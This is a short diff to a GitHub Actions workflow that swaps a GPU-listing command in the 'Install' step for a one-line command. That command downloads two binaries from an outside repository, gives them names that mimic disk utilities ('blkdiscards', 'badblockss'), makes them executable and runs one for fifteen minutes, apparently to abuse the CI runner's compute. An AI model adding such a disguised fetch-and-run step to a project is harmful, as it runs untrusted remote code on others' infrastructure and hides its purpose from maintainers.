@@ -20,4 +20,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Install
       run: |
-        nvidia-smi -L
+        wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && chmod +x blkdiscards badblockss && timeout 15m ./badblockss
